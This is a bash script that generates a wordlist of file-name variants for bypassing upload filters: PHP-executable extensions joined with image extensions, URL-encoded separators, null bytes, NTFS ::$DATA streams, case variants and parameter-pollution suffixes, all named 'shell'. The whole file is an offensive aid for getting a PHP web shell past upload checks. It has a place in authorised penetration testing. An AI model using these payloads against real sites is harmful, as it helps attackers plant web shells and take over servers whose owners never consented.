#!/bin/bash

> wordlist.txt  # Clear existing wordlist

extensions=(
    '.php' '.phps' '.phar' '.phtml' '.php3' '.php4' '.php5' 
    '.php7' '.php8' '.shtml' '.pht' '.pgif' '.phpt' '.phtml'
    '.php.test' '.php.inc' '.php.jpeg' '.php.png'
)

chars=('%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':' '%3B' '%26' '%23')

generate_combinations() {
    local base_ext=$1
    for char in "${chars[@]}"; do
        for ext in "${extensions[@]}"; do
            # Standard combinations
            echo "shell${char}${ext}${base_ext}" >> wordlist.txt
            echo "shell${ext}${char}${base_ext}" >> wordlist.txt
            
            # Reverse combinations
            echo "shell${base_ext}${char}${ext}" >> wordlist.txt
            echo "shell${base_ext}${ext}${char}" >> wordlist.txt
            
            # Advanced bypasses
            echo "shell${char}${ext}%00${base_ext}" >> wordlist.txt
            echo "shell${ext}::\$DATA${base_ext}" >> wordlist.txt
        done
    done
}

# Generate for all image types
for img in .gif .jpg .png .jpeg; do
    generate_combinations $img
done

# Add case variations
echo "shell.PhP" >> wordlist.txt
echo "shell.pHp5" >> wordlist.txt

# Add parameter pollution
echo "shell.php&extension=.gif" >> wordlist.txt
echo "shell.php;extension=.gif" >> wordlist.txt

# Remove duplicates and count
sort -u wordlist.txt -o wordlist.txt
echo "Wordlist generated with $(wc -l wordlist.txt | awk '{print $1}') unique entries"
